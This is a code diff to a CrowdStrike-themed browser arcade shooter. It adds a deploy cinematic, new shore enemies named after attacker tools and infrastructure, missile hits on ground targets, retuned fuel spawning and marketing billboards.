@@ -1329,6 +1329,10 @@ const TRANSLATIONS = {
     iz_pause_line2:'Stitched-together tools lose. Unified Falcon platform wins.',
     iz_pause_seed:'Completed run seed: ',
     iz_pause_seed_suffix:' — new seed each game keeps every run fresh',
+    iz_deploy_init:'FALCON DEPLOYMENT INITIATING',
+    iz_deploy_asset:'ASSET ASSIGNED · FALCON VESSEL ARMED',
+    iz_deploy_weapons:'WEAPONS FREE · ENGAGE ADVERSARY',
+    iz_deploy_go:'GO DARK',
     iz_act1_title:'DETECT',
     iz_act1_subtitle:'Anomaly detected. Sensors active. Adversary in the corridor.',
     iz_phase0_key:'OPERATION IRON FOREST',
@@ -1849,6 +1853,10 @@ const TRANSLATIONS = {
     iz_pause_line2:'Ferramentas costuradas perdem. A plataforma Falcon unificada vence.',
     iz_pause_seed:'Seed da rodada concluída: ',
     iz_pause_seed_suffix:' — cada nova partida usa uma seed diferente para manter as execuções únicas',
+    iz_deploy_init:'IMPLANTAÇÃO FALCON INICIANDO',
+    iz_deploy_asset:'ATIVO DESIGNADO · FALCON VESSEL ARMADO',
+    iz_deploy_weapons:'ARMAS LIVRES · ENGAJAR ADVERSÁRIO',
+    iz_deploy_go:'MODO SOMBRA ATIVADO',
     iz_act1_title:'DETECTAR',
     iz_act1_subtitle:'Anomalia detectada. Sensores ativos. O adversário está no corredor.',
     iz_phase0_key:'OPERAÇÃO FLORESTA DE FERRO',
@@ -2367,6 +2375,10 @@ const TRANSLATIONS = {
     iz_pause_line2:'Las herramientas unidas a la fuerza pierden. La plataforma Falcon unificada gana.',
     iz_pause_seed:'Semilla de ejecución completada: ',
     iz_pause_seed_suffix:' — cada nueva partida usa una semilla distinta para mantener cada ejecución fresca',
+    iz_deploy_init:'DESPLIEGUE FALCON INICIANDO',
+    iz_deploy_asset:'ACTIVO ASIGNADO · FALCON VESSEL ARMADO',
+    iz_deploy_weapons:'ARMAS LIBRES · COMPROMETER ADVERSARIO',
+    iz_deploy_go:'MODO OSCURO ACTIVADO',
     iz_act1_title:'DETECTAR',
     iz_act1_subtitle:'Anomalía detectada. Sensores activos. El adversario está en el corredor.',
     iz_phase0_key:'OPERACIÓN BOSQUE DE HIERRO',
@@ -2885,6 +2897,10 @@ const TRANSLATIONS = {
     iz_pause_line2:'寄せ集めのツールでは負けます。統合されたFalconプラットフォームが勝ちます。',
     iz_pause_seed:'完了ランのシード: ',
     iz_pause_seed_suffix:' — 新しいゲームごとに新しいシードが使われ、毎回違うランになります',
+    iz_deploy_init:'FALCONデプロイメント開始中',
+    iz_deploy_asset:'アセット指定済 · FALCONベッセル武装',
+    iz_deploy_weapons:'武器解放 · 敵対者と交戦せよ',
+    iz_deploy_go:'暗闇へ突入',
     iz_act1_title:'検知',
     iz_act1_subtitle:'異常を検知。センサー稼働中。敵対者がコリドー内に侵入しています。',
     iz_phase0_key:'オペレーション・アイアンフォレスト',
@@ -6967,14 +6983,15 @@ window.addEventListener("resize",resize); resize();
 // not silently create a new unreachable state. All STATE = … and
 // STATE === … comparisons use S.* throughout.
 const S = Object.freeze({
-  TITLE:       'TITLE',
-  PHASE_INTRO: 'PHASE_INTRO',
-  PLAYING:     'PLAYING',
-  BOSS_INTRO:  'BOSS_INTRO',
-  BOSS_FIGHT:  'BOSS_FIGHT',
-  PHASE_END:   'PHASE_END',
-  GAME_OVER:   'GAME_OVER',
-  WIN:         'WIN',
+  TITLE:             'TITLE',
+  PHASE_INTRO:       'PHASE_INTRO',
+  DEPLOY_CINEMATIC:  'DEPLOY_CINEMATIC',
+  PLAYING:           'PLAYING',
+  BOSS_INTRO:        'BOSS_INTRO',
+  BOSS_FIGHT:        'BOSS_FIGHT',
+  PHASE_END:         'PHASE_END',
+  GAME_OVER:         'GAME_OVER',
+  WIN:               'WIN',
 });
 
 // ── World Coordinate System ───────────────────────────────────────────
@@ -7007,22 +7024,22 @@ function sri(a,b){ return Math.floor(sr(a,b+1)); }
 // across generateEnemiesAhead(), addFuelBarge(), updGround(), populatePhase().
 // Add a new scalar? Add it here. One place, one audit.
 const DIFFICULTY = [
-  // ph 0 — easiest
-  { refuelRate:36, landDepotRate:13, fuelSpawnChance:0.17, fuelDoubleChance:0.31,
+  // ph 0 — easiest (fuel/pickups reduced: was 0.17/0.31/0.18 — too flooded)
+  { refuelRate:36, landDepotRate:13, fuelSpawnChance:0.09, fuelDoubleChance:0.15,
     fuelGridInterval:715,  fuelClusterCount:5, bossZoneInterval:160,
-    featuredPickups:3,     dropRate:1.00, pickupSpawnMax:0.18 },
-  // ph 1
-  { refuelRate:35, landDepotRate:12, fuelSpawnChance:0.16, fuelDoubleChance:0.29,
+    featuredPickups:3,     dropRate:1.00, pickupSpawnMax:0.10 },
+  // ph 1 (fuel/pickups reduced: was 0.16/0.29/0.14)
+  { refuelRate:35, landDepotRate:12, fuelSpawnChance:0.09, fuelDoubleChance:0.14,
     fuelGridInterval:770,  fuelClusterCount:5, bossZoneInterval:174,
-    featuredPickups:2,     dropRate:0.78, pickupSpawnMax:0.14 },
-  // ph 2
-  { refuelRate:33, landDepotRate:11, fuelSpawnChance:0.15, fuelDoubleChance:0.27,
+    featuredPickups:2,     dropRate:0.78, pickupSpawnMax:0.09 },
+  // ph 2 (fuel/pickups reduced: was 0.15/0.27/0.12)
+  { refuelRate:33, landDepotRate:11, fuelSpawnChance:0.10, fuelDoubleChance:0.15,
     fuelGridInterval:825,  fuelClusterCount:4, bossZoneInterval:188,
-    featuredPickups:2,     dropRate:0.56, pickupSpawnMax:0.12 },
-  // ph 3
-  { refuelRate:31, landDepotRate:11, fuelSpawnChance:0.14, fuelDoubleChance:0.25,
+    featuredPickups:2,     dropRate:0.56, pickupSpawnMax:0.09 },
+  // ph 3 (fuel slightly reduced: was 0.14/0.25/0.10)
+  { refuelRate:31, landDepotRate:11, fuelSpawnChance:0.10, fuelDoubleChance:0.14,
     fuelGridInterval:880,  fuelClusterCount:4, bossZoneInterval:202,
-    featuredPickups:1,     dropRate:0.34, pickupSpawnMax:0.10 },
+    featuredPickups:1,     dropRate:0.34, pickupSpawnMax:0.08 },
   // ph 4
   { refuelRate:30, landDepotRate:10, fuelSpawnChance:0.14, fuelDoubleChance:0.25,
     fuelGridInterval:935,  fuelClusterCount:4, bossZoneInterval:216,
@@ -7365,6 +7382,16 @@ function updHomingMissiles(dt){
     }
     if(!hit&&BOSS&&Math.hypot(BOSS.x-m.x,BOSS.y-m.y)<(BOSS.w/2+10)){
       hitBoss(m.dmg); burst(m.x,m.y,18,['#74ff88','#fff','#ffd84d'],160,0.65); hit=true;
+    }
+    if(!hit){
+      for(const g of GTERGETS){
+        if(!g.alive) continue;
+        const gsy=w2s(g.wy);
+        if(Math.hypot(g.x-m.x,gsy-m.y)<(g.w/2+10)){
+          g.hp-=m.dmg; g.hf=0.09; if(g.hp<=0) killG(g);
+          burst(m.x,m.y,14,['#74ff88','#fff','#ffd84d'],140,0.55); SFX.explode(); hit=true; break;
+        }
+      }
     }
     if(hit){ HMISSILES.splice(i,1); continue; }
     if(m.x<-60||m.x>VW+60||m.y<-60||m.y>VH+60) HMISSILES.splice(i,1);
@@ -7999,7 +8026,7 @@ const PHASES=[
     col:'#e03030', water1:'#0e1318', water2:'#1c2830', land1:'#1e2216', land2:'#2c3020',
     debrief:'FANCY BEAR relies on siloed security tools unable to connect endpoint, email and identity signals. XDR eliminates that blind spot.',
     module:'Falcon Insight XDR', dur:46, speed:86,
-    air:['phishDrone','stealthJet'], river:['skiff'], land:['certRelay','fuelDepot'], boss:'FANCY BEAR',
+    air:['phishDrone','stealthJet'], river:['skiff'], land:['certRelay','lolbinTower'], boss:'FANCY BEAR',
     objectives:[
       {text:'Intercept 12 credential drones',type:'kills',target:12,current:0,done:false},
       {text:'Destroy 4 comms relays',type:'groundKills',target:4,current:0,done:false},
@@ -8019,7 +8046,7 @@ const PHASES=[
     col:'#ff62ff', water1:'#18091c', water2:'#2c1234', land1:'#241428', land2:'#382040',
     debrief:'SCATTERED SPIDER breached a major company via a 10-minute phone call. No malware, no exploits — just social engineering.',
     module:'Falcon Identity Protection', dur:48, speed:90,
-    air:['vishDrone','phishDrone'], river:['idSkiff','skiff'], land:['vishRelay','fuelDepot'], boss:'SCATTERED SPIDER',
+    air:['vishDrone','phishDrone'], river:['idSkiff','skiff'], land:['vishRelay','sniperPost'], boss:'SCATTERED SPIDER',
     objectives:[
       {text:'Destroy 5 vishing relay towers',type:'groundKills',target:5,current:0,done:false},
       {text:'Intercept 10 CredSkiff identity harvesters',type:'typeKills',target:10,current:0,done:false,eType:'idSkiff'},
@@ -8039,7 +8066,7 @@ const PHASES=[
     col:'#88ff55', water1:'#0d1a08', water2:'#182c10', land1:'#162212', land2:'#24381a',
     debrief:'APT41 operates under MSS direction with a unique dual mandate — state espionage and personal financial gain simultaneously.',
     module:'Falcon Cloud Security', dur:50, speed:94,
-    air:['supplyDrone','stealthJet'], river:['poisonBarge','skiff'], land:['supplyRelay','fuelDepot'], boss:'WICKED PANDA',
+    air:['supplyDrone','stealthJet'], river:['poisonBarge','skiff'], land:['supplyRelay','c2Node'], boss:'WICKED PANDA',
     objectives:[
       {text:'Sink 3 PoisonBarge supply chain carriers',type:'typeKills',target:3,current:0,done:false,eType:'poisonBarge'},
       {text:'Destroy 5 software relay towers',type:'groundKills',target:5,current:0,done:false},
@@ -8059,7 +8086,7 @@ const PHASES=[
     col:'#ff8d39', water1:'#1a1008', water2:'#32180e', land1:'#26160c', land2:'#3a2214',
     debrief:'COZY BEAR abused OAuth device code flow — a legitimate authentication mechanism — to gain persistent cloud access with zero malware.',
     module:'Falcon Identity Protection', dur:52, speed:98,
-    air:['tokenDrone','stealthJet'], river:['tokenSkiff','mine'], land:['oauthRelay','fuelDepot'], boss:'COZY BEAR',
+    air:['tokenDrone','stealthJet'], river:['tokenSkiff','mine'], land:['oauthRelay','jammerTower'], boss:'COZY BEAR',
     objectives:[
       {text:'Destroy 6 OAuth relay stations',type:'groundKills',target:6,current:0,done:false},
       {text:'Intercept 15 token drones',type:'typeKills',target:15,current:0,done:false,eType:'tokenDrone'},
@@ -8079,7 +8106,7 @@ const PHASES=[
     col:'#4ab6ff', water1:'#08111b', water2:'#122338', land1:'#141f2a', land2:'#1e2f3e',
     debrief:'North Korea deploys thousands of IT workers globally under false identities. Stopping it requires behavioural analytics, not signatures.',
     module:'Falcon Intelligence', dur:54, speed:102,
-    air:['idGhost','lolBin'], river:['runnerBoat','idSkiff'], land:['insiderRelay','fuelDepot'], boss:'LABYRINTH CHOLLIMA',
+    air:['idGhost','lolBin'], river:['runnerBoat','idSkiff'], land:['insiderRelay','lolbinTower'], boss:'LABYRINTH CHOLLIMA',
     objectives:[
       {text:'Destroy 4 insider relay nodes',type:'groundKills',target:4,current:0,done:false},
       {text:'Stop 8 ExfilRunner data couriers',type:'typeKills',target:8,current:0,done:false,eType:'runnerBoat'},
@@ -8099,7 +8126,7 @@ const PHASES=[
     col:'#ff5a4d', water1:'#1a0a0a', water2:'#361212', land1:'#2a1212', land2:'#421a1a',
     debrief:'The Change Healthcare attack (2024) is the largest healthcare data breach in US history. Manual response was impossible — only automation wins.',
     module:'Fusion SOAR', dur:56, speed:108,
-    air:['cryptoJet','tokenDrone'], river:['armoredBarge','mine','runnerBoat'], land:['edgeTurret','fuelDepot'], boss:'CARBON SPIDER',
+    air:['cryptoJet','tokenDrone'], river:['armoredBarge','mine','runnerBoat'], land:['edgeTurret','sniperPost'], boss:'CARBON SPIDER',
     objectives:[
       {text:'Sink 4 CryptoBarge armoured ransomware carriers',type:'typeKills',target:4,current:0,done:false,eType:'armoredBarge'},
       {text:'Defuse 8 ZeroDayMine detonators',type:'typeKills',target:8,current:0,done:false,eType:'mine'},
@@ -8119,7 +8146,7 @@ const PHASES=[
     col:'#2af0d0', water1:'#081816', water2:'#102e2a', land1:'#141f1e', land2:'#1e3330',
     debrief:'One fake PDF job offer — one employee opened it — $625M gone 6 days later. SIEM behavioural analytics would have caught it in minutes.',
     module:'Next-Gen SIEM', dur:54, speed:112,
-    air:['aiMirage','cryptoJet'], river:['tokenSkiff','runnerBoat'], land:['cryptoRelay','fuelDepot'], boss:'FAMOUS CHOLLIMA',
+    air:['aiMirage','cryptoJet'], river:['tokenSkiff','runnerBoat'], land:['cryptoRelay','c2Node'], boss:'FAMOUS CHOLLIMA',
     objectives:[
       {text:'Stop 10 OAuthSkiff token exfil runners',type:'typeKills',target:10,current:0,done:false,eType:'tokenSkiff'},
       {text:'Destroy 5 crypto relay towers',type:'groundKills',target:5,current:0,done:false},
@@ -8159,7 +8186,7 @@ const PHASES=[
     col:'#ffaa00', water1:'#1a1208', water2:'#2e2010', land1:'#261a0c', land2:'#3c2a14',
     debrief:'STAR KITTEN blurs the line between espionage and influence operations. They impersonate think tanks to deliver surveillance implants.',
     module:'Falcon Intelligence', dur:52, speed:114,
-    air:['nokNok','stealthJet'], river:['skiff','idSkiff'], land:['certRelay','fuelDepot'], boss:'STAR KITTEN',
+    air:['nokNok','stealthJet'], river:['skiff','idSkiff'], land:['certRelay','jammerTower'], boss:'STAR KITTEN',
     objectives:[
       {text:'Destroy 4 surveillance relay nodes',type:'groundKills',target:4,current:0,done:false},
       {text:'Intercept 12 surveillance drones',type:'kills',target:12,current:0,done:false},
@@ -8273,7 +8300,7 @@ let SCORE=0, HISCORE=_loadStoredNumber('cs_hiscore_incident_zero_v1',0);
 let LIVES=5, FUEL=100, STREAK=0, MAXSTREAK=0;
 let intelOpen=false;
 
-const BULLETS=[], EBULLETS=[], ENEMIES=[], PICKUPS=[], BRIDGES=[], GTERGETS=[], FBARGES=[];
+const BULLETS=[], EBULLETS=[], ENEMIES=[], PICKUPS=[], BRIDGES=[], GTERGETS=[], FBARGES=[], BILLBOARDS=[];
 const AMODS=Object.create(null);
 // ARCH: Removed MINE_WARN — it was declared globally but never read.
 // Mine proximity is tracked on individual enemy objects via e.proxWarn.
@@ -8315,7 +8342,7 @@ function addEnemy(type,wy,x,lane='air'){
     case 'stealthJet':  Object.assign(e,{w:28,h:20,hp:2,maxHp:2,score:150,vx:rnd(-40,40),stealth:true,revealed:false,shoot:rnd(1.5,2.6)*sm}); break;
     case 'aiMirage':    Object.assign(e,{w:28,h:28,hp:2,maxHp:2,score:170,vx:rnd(-26,26),stealth:true,revealed:false,shoot:rnd(1.6,2.8)*sm}); break;
     case 'idGhost':     Object.assign(e,{w:28,h:32,hp:2,maxHp:2,score:190,vx:rnd(-22,22),stealth:true,revealed:false,shoot:rnd(1.6,2.8)*sm}); break;
-    case 'lolBin':      Object.assign(e,{w:44,h:30,hp:1,score:120,vx:rnd(-24,24),stealth:true,revealed:false,shoot:rnd(1.8,3.0)*sm}); break;
+    case 'lolBin':      Object.assign(e,{w:62,h:44,hp:1,score:120,vx:rnd(-24,24),stealth:true,revealed:false,shoot:rnd(1.8,3.0)*sm}); break;
     case 'tokenDrone':  Object.assign(e,{w:24,h:24,hp:2,maxHp:2,score:130,vx:rnd(-46,46),shoot:rnd(1.6,2.8)*sm}); break;
     case 'supplyDrone': Object.assign(e,{w:26,h:22,hp:2,maxHp:2,score:140,vx:rnd(-32,32),shoot:rnd(1.8,3.0)*sm}); break;
     case 'cryptoJet':   Object.assign(e,{w:30,h:20,hp:2,maxHp:2,score:160,vx:rnd(-38,38),shoot:rnd(1.2,2.2)*sm}); break;
@@ -8327,14 +8354,15 @@ function addEnemy(type,wy,x,lane='air'){
     case 'poisonBarge': Object.assign(e,{lane:'river',w:62,h:24,hp:5,maxHp:5,score:260,vx:rnd(-8,8),shoot:rnd(1.1,1.9)*sm}); break;
     case 'armoredBarge':Object.assign(e,{lane:'river',w:66,h:26,hp:7,maxHp:7,score:285,vx:rnd(-7,7),shoot:rnd(0.9,1.6)*sm}); break;
     case 'mine':        Object.assign(e,{lane:'river',w:20,h:20,hp:1,score:58,vx:rnd(-12,12),proxWarn:false}); break;
-    case 'powershell':  Object.assign(e,{w:46,h:30,hp:3,maxHp:3,score:185,vx:rnd(-28,28),stealth:true,revealed:false,shoot:rnd(1.2,2.2)*sm}); break;
-    case 'wmiExec':     Object.assign(e,{w:44,h:30,hp:2,maxHp:2,score:155,vx:rnd(-36,36),stealth:true,revealed:false,shoot:rnd(1.6,2.8)*sm}); break;
-    case 'bitsAdmin':   Object.assign(e,{w:46,h:30,hp:1,score:140,vx:rnd(-18,18),stealth:true,revealed:false,shoot:rnd(2.2,3.8)*sm,dropsPickup:true}); break;
-    case 'eventvwr':     Object.assign(e,{w:48,h:32,hp:2,maxHp:2,score:210,vx:rnd(-22,22),stealth:true,revealed:false,shoot:rnd(1.8,3.0)*sm,cloneFlash:0}); break;
-    case 'certUtil':    Object.assign(e,{w:44,h:30,hp:2,maxHp:2,score:148,vx:rnd(-16,16),stealth:true,revealed:false,shoot:rnd(1.8,3.2)*sm}); break;
-    case 'rundll32':    Object.assign(e,{w:46,h:30,hp:3,maxHp:3,score:195,vx:rnd(-20,20),stealth:true,revealed:false,shoot:rnd(1.4,2.6)*sm}); break;
-    case 'schtasks':    Object.assign(e,{w:46,h:30,hp:2,maxHp:2,score:168,vx:rnd(-22,22),stealth:true,revealed:false,shoot:rnd(1.6,2.8)*sm,respawned:false}); break;
-    case 'mshta':       Object.assign(e,{w:44,h:30,hp:1,score:132,vx:rnd(-42,42),stealth:true,revealed:false,shoot:rnd(1.3,2.2)*sm}); break;
+    // LOLBin sizes increased for authentic terminal window rendering (more code lines visible)
+    case 'powershell':  Object.assign(e,{w:70,h:48,hp:3,maxHp:3,score:185,vx:rnd(-28,28),stealth:true,revealed:false,shoot:rnd(1.2,2.2)*sm}); break;
+    case 'wmiExec':     Object.assign(e,{w:64,h:46,hp:2,maxHp:2,score:155,vx:rnd(-36,36),stealth:true,revealed:false,shoot:rnd(1.6,2.8)*sm}); break;
+    case 'bitsAdmin':   Object.assign(e,{w:66,h:48,hp:1,score:140,vx:rnd(-18,18),stealth:true,revealed:false,shoot:rnd(2.2,3.8)*sm,dropsPickup:true}); break;
+    case 'eventvwr':    Object.assign(e,{w:70,h:48,hp:2,maxHp:2,score:210,vx:rnd(-22,22),stealth:true,revealed:false,shoot:rnd(1.8,3.0)*sm,cloneFlash:0}); break;
+    case 'certUtil':    Object.assign(e,{w:64,h:46,hp:2,maxHp:2,score:148,vx:rnd(-16,16),stealth:true,revealed:false,shoot:rnd(1.8,3.2)*sm}); break;
+    case 'rundll32':    Object.assign(e,{w:68,h:48,hp:3,maxHp:3,score:195,vx:rnd(-20,20),stealth:true,revealed:false,shoot:rnd(1.4,2.6)*sm}); break;
+    case 'schtasks':    Object.assign(e,{w:66,h:48,hp:2,maxHp:2,score:168,vx:rnd(-22,22),stealth:true,revealed:false,shoot:rnd(1.6,2.8)*sm,respawned:false}); break;
+    case 'mshta':       Object.assign(e,{w:62,h:46,hp:1,score:132,vx:rnd(-42,42),stealth:true,revealed:false,shoot:rnd(1.3,2.2)*sm}); break;
   }
   ENEMIES.push(e);
 }
@@ -8353,6 +8381,11 @@ function addGround(type,wy,x,side='left'){
     case 'wiperRelay':   Object.assign(g,{hp:4,maxHp:4,score:195,w:28,h:38}); break;
     case 'edgeTurret':   Object.assign(g,{hp:4,maxHp:4,score:205,w:30,h:30}); break;
     case 'malwareRelay': Object.assign(g,{hp:2,maxHp:2,score:108,w:24,h:34}); break;
+    // ── Cinematic shore enemies ──────────────────────────────────────────
+    case 'lolbinTower': Object.assign(g,{hp:4,maxHp:4,score:220,w:34,h:54,shoot:rnd(0.9,1.8),_proc:0}); break;
+    case 'sniperPost':  Object.assign(g,{hp:2,maxHp:2,score:185,w:26,h:38,shoot:rnd(2.2,3.6),_angle:0}); break;
+    case 'c2Node':      Object.assign(g,{hp:5,maxHp:5,score:252,w:38,h:50,shoot:rnd(1.1,2.0),_dish:0}); break;
+    case 'jammerTower': Object.assign(g,{hp:3,maxHp:3,score:212,w:28,h:46,shoot:rnd(1.3,2.4),_ring:0}); break;
   }
   GTERGETS.push(g);
 }
@@ -8360,14 +8393,44 @@ function addBridge(wy,boss=false){
   const r=getRivW(wy);
   BRIDGES.push({wy,cx:r.cx,bw:r.cw+46,hp:boss?22:10,maxHp:boss?22:10,alive:true,boss});
 }
+// GTR billboard messages — short, punchy CrowdStrike intelligence soundbites
+// Billboard messages — max ~27 chars per line so they fit the 190px panel
+const BB_MSGS=[
+  ['STOP BREACHES. NOT ALERTS.','CROWDSTRIKE FALCON PLATFORM'],
+  ['ADVERSARY INTEL','STOPS BREACHES, NOT MALWARE'],
+  ['FALCON XDR','SEE EVERYTHING · STOP ALL'],
+  ['1 MIN DETECT · 10 MIN INVEST','60 MINUTES TO CONTAIN'],
+  ['STATE-SPONSORED ACTORS','NEUTRALISED DAILY'],
+  ['OVERWATCH · 24/7','HUMAN HUNTERS. MACHINE SPEED.'],
+  ['CHARLOTTE AI','AUTONOMOUS INVESTIGATION'],
+  ['ZERO TRUST STARTS HERE','FALCON IDENTITY PROTECTION'],
+  ['2,600 ORGS. ONE ZERO-DAY.','MOVEIT — CONTAINED IN MINUTES'],
+  ['MEAN TIME TO DETECT: 1 MIN','197-DAY AVG? NOT ON OUR WATCH'],
+  ['LOLBins? CAUGHT RED-HANDED','BEHAVIOURAL AI SEES EVERY MOVE'],
+  ['ADVERSARY INTELLIGENCE','CROWDSTRIKE GTR 2025'],
+];
+function addBillboard(wy,side){
+  const BB_W=190, SCREEN_MARGIN=28;
+  const r=getRivW(wy);
+  const shore=side==='left'?r.cx-r.cw/2:r.cx+r.cw/2;
+  // Pole hugs the shore; panel extends fully inland
+  const pole=side==='left'?shore-20:shore+20;
+  // Guard: full panel must fit on screen with a comfortable margin
+  if(side==='left'  && pole-BB_W < SCREEN_MARGIN) return;
+  if(side==='right' && pole+BB_W > VW-SCREEN_MARGIN) return;
+  const msgIdx=Math.floor(Math.random()*BB_MSGS.length);
+  BILLBOARDS.push({wy,x:pole,side,msgIdx,t:0,alive:true});
+}
 
 // ── Spawn State ───────────────────────────────────────────────────────
 const SPAWN_STATE={ cursor:0, airDensity:0, riverDensity:0, groundDensity:0,
-  doubleBankChance:0, formWeights:[], consecStealth:0, bossZoneStart:0, stealthTypes:null };
+  doubleBankChance:0, formWeights:[], consecStealth:0, bossZoneStart:0, stealthTypes:null,
+  lastBillboardWY:-9999 };
 
 function initSpawnState(){
   const phaseBase=0.28+Math.min(0.44,phIdx*0.052);
   SPAWN_STATE.cursor=280;
+  SPAWN_STATE.lastBillboardWY=-9999;
   SPAWN_STATE.airDensity=sr(0.52,0.68)+phaseBase;
   SPAWN_STATE.riverDensity=sr(0.48,0.64)+phaseBase;
   SPAWN_STATE.groundDensity=sr(0.42,0.56)+phaseBase;
@@ -8388,7 +8451,11 @@ function generateEnemiesAhead(){
     if(RW<120) continue;
     const progressFrac=clamp(wy/W.progressMax,0,1);
     const phCap=0.52+phIdx*0.055;
-    const rampFactor=Math.min(phCap,0.30+progressFrac*0.70);
+    // ARCH: rampFactor — was 0.30 start which gave an immediate 30% density hit on phase entry.
+    // Now 0.18 start so early-phase enemies ramp in gradually rather than hard-starting.
+    const rampFactor=Math.min(phCap,0.18+progressFrac*0.82);
+    // fuelRamp — fuel barges also ramp up over phase progress so early segments aren't flooded.
+    const fuelRamp=Math.min(1.0,0.30+progressFrac*0.70);
 
     // Air
     if(seededRng()<S.airDensity*rampFactor){
@@ -8447,8 +8514,9 @@ function generateEnemiesAhead(){
     if(seededRng()<0.09&&wy>700&&wy<S.bossZoneStart)
       addBridge(wy+sri(-18,22),false);
 
-    // Fuel barges — ARCH: uses D.fuelSpawnChance and D.fuelDoubleChance from DIFF()
-    if(seededRng()<D.fuelSpawnChance&&wy>250){
+    // Fuel barges — ARCH: uses D.fuelSpawnChance * fuelRamp so early phase starts sparse.
+    // fuelRamp ensures fuel availability scales with phase progress (not a constant flood).
+    if(seededRng()<D.fuelSpawnChance*fuelRamp&&wy>250){
       addFuelBarge(wy+sri(-18,18),L+RW*sr(0.10,0.90));
       if(seededRng()<D.fuelDoubleChance&&RW>600)
         addFuelBarge(wy+sri(-18,18),L+RW*sr(0.10,0.90));
@@ -8460,11 +8528,12 @@ function generateEnemiesAhead(){
       addPickup(wy+sri(-10,10),clamp(mx,L+28,R-28),'module',MKEYS[sri(0,MKEYS.length-1)]);
     }
 
-    // Land fuel depots
-    if(seededRng()<sr(0.18,0.26)){
-      const side=seededRng()<0.5?'left':'right';
-      const dx=side==='left'?L-sri(12,28):R+sri(12,28);
-      addGround('fuelDepot',wy+sri(-10,10),dx,side);
+    // Billboards — at most 1 per 900 world-units, skipped if panel won't fit on screen
+    if(seededRng()<0.06&&wy>700&&wy<S.bossZoneStart-500&&wy-S.lastBillboardWY>900){
+      const bbSide=seededRng()<0.5?'left':'right';
+      const prevLen=BILLBOARDS.length;
+      addBillboard(wy,bbSide);
+      if(BILLBOARDS.length>prevLen) S.lastBillboardWY=wy; // only record if actually placed
     }
   }
 }
@@ -8520,7 +8589,7 @@ function initPhase(idx){
 
   // Entity cleardown
   ENEMIES.length=0; PICKUPS.length=0; BRIDGES.length=0;
-  GTERGETS.length=0; FBARGES.length=0;
+  GTERGETS.length=0; FBARGES.length=0; BILLBOARDS.length=0;
   BOSS=null; BQUEUE.length=0;
   EBULLETS.length=0; HMISSILES.length=0;
 
@@ -8616,7 +8685,9 @@ function initPhase(idx){
   if(!prevAct||prevAct.num!==act.num)
     showActAnn(act.num, act.title, act.subtitle, act.col);
 
-  STATE=S.PHASE_INTRO;
+  // Skip PHASE_INTRO — go straight to the combined deploy cinematic
+  window._deployT=0;
+  STATE=S.DEPLOY_CINEMATIC;
 }
 
 function startGame(){
@@ -9267,13 +9338,58 @@ function updGround(dt){
       if(dist<46){ FUEL=Math.min(100,FUEL+DIFF().landDepotRate*dt); SFX.refuel(); }
       continue;
     }
+    // Animate new shore entity internal timers
+    if(g._dish!==undefined) g._dish+=dt*1.2;
+    if(g._ring!==undefined) g._ring+=dt*2.4;
+    if(g._proc!==undefined){ g._proc+=dt; if(g._proc>3.6) g._proc=0; }
+    if(g._angle!==undefined) g._angle+=dt*0.9;
     if(!canSeeG(g)) continue;
     if((g.shoot-=dt)<=0&&sy>10&&sy<VH-82){
-      g.shoot=rnd(1.6,3.4)*sm;
       const dx=PL.x-g.x,dy=PL.y-sy,len=Math.hypot(dx,dy)||1;
-      const col=g.type==='edgeTurret'?'#ff8d39':g.type==='wiperRelay'?'#c850ff':'#42d9ff';
-      addBullet(g.x,sy,dx/len*80,dy/len*155,1,col,true);
-      if(g.type==='edgeTurret'&&phIdx>=7) addBullet(g.x,sy,dx/len*80+rnd(-18,18),dy/len*155,1,col,true);
+      let col='#42d9ff';
+      switch(g.type){
+        case 'edgeTurret':
+          g.shoot=rnd(1.2,2.4)*sm; col='#ff8d39';
+          addBullet(g.x,sy,dx/len*80,dy/len*155,1,col,true);
+          if(phIdx>=7) addBullet(g.x,sy,dx/len*80+rnd(-20,20),dy/len*155,1,col,true);
+          break;
+        case 'wiperRelay':
+          g.shoot=rnd(1.4,2.6)*sm; col='#c850ff';
+          addBullet(g.x,sy,dx/len*80,dy/len*155,1,col,true);
+          break;
+        case 'lolbinTower':
+          // 3-shot spread: aimed + ±22° flanks — LOLBin process scatter
+          g.shoot=rnd(0.9,1.8)*sm; col='#e0003c';
+          addBullet(g.x,sy,dx/len*72,dy/len*160,1,col,true);
+          addBullet(g.x,sy,dx/len*72+38,dy/len*148,1,col,true);
+          addBullet(g.x,sy,dx/len*72-38,dy/len*148,1,col,true);
+          break;
+        case 'sniperPost':
+          // Single high-speed precision round — very accurate
+          g.shoot=rnd(2.4,3.8)*sm; col='#ff8d39';
+          addBullet(g.x,sy,dx/len*22,dy/len*290,2,'#ffcc44',true);
+          break;
+        case 'c2Node':
+          // Burst: 4 radial shots + aimed centre
+          g.shoot=rnd(1.1,2.0)*sm; col='#42d9ff';
+          addBullet(g.x,sy,dx/len*80,dy/len*155,1,col,true);
+          for(let bi=0;bi<4;bi++){
+            const ba=bi/4*TAU;
+            addBullet(g.x,sy,Math.cos(ba)*110,Math.sin(ba)*110,1,'rgba(66,217,255,0.7)',true);
+          }
+          break;
+        case 'jammerTower':
+          // Spiral burst — 5 shots at rotated angles
+          g.shoot=rnd(1.3,2.2)*sm; col='#ffd84d';
+          for(let bi=0;bi<5;bi++){
+            const ba=(bi/5)*TAU + g._ring;
+            addBullet(g.x,sy,Math.cos(ba)*120,Math.sin(ba)*120,1,'#ffd84d',true);
+          }
+          break;
+        default:
+          g.shoot=rnd(1.6,3.4)*sm; col='#42d9ff';
+          addBullet(g.x,sy,dx/len*80,dy/len*155,1,col,true);
+      }
     }
   }
 }
@@ -9793,25 +9909,162 @@ function drawWorld(dt){
 }
 
 function drawFuelBarges(){
+  // ARCH: Cinematic battery / power-cell supply pack — IZ field energy unit.
+  // fb.w=68, fb.h=24. Horizontal D-cell battery: negative cap left, positive nub right,
+  // 4 animated charge bars + lightning symbol, electric arc beam when refueling.
+  const _t=Date.now()*0.001;
   for(const fb of FBARGES){
-    if(!fb.alive) continue; const sy=w2s(fb.wy); if(sy<-54||sy>VH+54) continue;
-    const pulse=fb.pulse>0; CX.save(); CX.translate(fb.x,sy);
-    if(pulse){ CX.shadowBlur=24; CX.shadowColor='#74ff88'; }
-    CX.fillStyle=pulse?'#c0ffb8':'#3a7a40'; CX.fillRect(-fb.w/2,-fb.h/2,fb.w,fb.h);
-    CX.fillStyle=pulse?'#88ff80':'#1a3e20'; CX.fillRect(-fb.w/2+4,-fb.h/2+3,fb.w-8,fb.h-6);
-    CX.fillStyle='rgba(0,0,0,0.4)'; CX.fillRect(-fb.w/2+6,-fb.h/2+5,fb.w-12,5);
